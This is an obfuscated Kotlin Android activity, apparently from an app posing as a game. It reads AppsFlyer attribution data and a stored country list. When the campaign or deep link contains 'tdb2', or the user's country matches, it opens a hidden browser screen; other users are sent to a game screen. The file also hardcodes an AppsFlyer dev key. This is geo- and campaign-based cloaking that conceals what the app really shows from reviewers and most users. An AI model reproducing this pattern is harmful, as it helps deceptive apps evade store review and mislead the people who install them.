package com.deuscraft.Tu

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.deuscraft.Tu.NaaaaameClass.Companion.gttC1gttg
import com.deuscraft.Tu.NaaaaameClass.Companion.hyyDEEPLfrfr
import com.deuscraft.Tu.NaaaaameClass.Companion.gtgttappsCheckfrr
import com.deuscraft.Tu.NaaaaameClass.Companion.hyhycountryCodefrrfr
import com.deuscraft.Tu.NaaaaameClass.Companion.gthygeomeo
import com.deuscraft.Tu.databinding.ActivitySecFillltBinding
import com.orhanobut.hawk.Hawk
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class SecFillltActivity : AppCompatActivity() {
    lateinit var gbgnhnh: ActivitySecFillltBinding

    private fun hyyjuuuj() {
        val bgnhhjuy = Intent(this@SecFillltActivity, GgaaagagagameActivity::class.java)
        Hawk.put(gthygeomeo, null)
        Hawk.put(hyhycountryCodefrrfr, null)
        Hawk.put(gtgttappsCheckfrr, null)
        startActivity(bgnhhjuy)
        finish()
    }

    private fun gtggtgttg() {
        val gtgtgtt = Intent(this@SecFillltActivity, BroovvssseeerrActivity::class.java)
        Hawk.put(gthygeomeo, null)
        Hawk.put(hyhycountryCodefrrfr, null)
        Hawk.put(gtgttappsCheckfrr, null)
        startActivity(gtgtgtt)
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        gbgnhnh = ActivitySecFillltBinding.inflate(layoutInflater)
        setContentView(gbgnhnh.root)

        val gtgtappsChfrffrrf: String? = Hawk.get(gtgttappsCheckfrr, "null")

        if (gtgtappsChfrffrrf == "1") {
            AppsFlyerLib.getInstance()
                .init("DDddJPVqjmgHQEsXoawWmb", gtggtfrfrfrpl, applicationContext)
            AppsFlyerLib.getInstance().start(this)
        }

        gtgtgt()

    }

    private val gtggtfrfrfrpl = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val gttggtgt = data?.get("campaign").toString()
            Hawk.put(gttC1gttg, gttggtgt)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }


    private fun gtgtgt() {

        val gtgtgtgt: String = Hawk.get(gthygeomeo)
        val countyCfrfrrfrf: String = Hawk.get(hyhycountryCodefrrfr, "null")

        val deeplinkgtgttg: String? = Hawk.get(hyyDEEPLfrfr, "null")
        val appsChfrfgtg: String? = Hawk.get(gtgttappsCheckfrr, "null")
        var gttgnamingfrfrrr: String? = Hawk.get(gttC1gttg)

        if (appsChfrfgtg == "1") {
            val gtgtgttg = Executors.newSingleThreadScheduledExecutor()
            gtgtgttg.scheduleAtFixedRate({
                if (gttgnamingfrfrrr != null) {

                    if (gttgnamingfrfrrr!!.contains("tdb2") || gtgtgtgt.contains(countyCfrfrrfrf) || deeplinkgtgttg!!.contains("tdb2")) {
                        gtgtgttg.shutdown()
                        gtggtgttg()
                    } else {
                        gtgtgttg.shutdown()
                        hyyjuuuj()
                    }
                } else {
                    gttgnamingfrfrrr = Hawk.get(gttC1gttg)
                }
            }, 0, 1, TimeUnit.SECONDS)
        }  else if (gtgtgtgt.contains(countyCfrfrrfrf)) {
            gtggtgttg()
        } else {
            hyyjuuuj()
        }

    }


}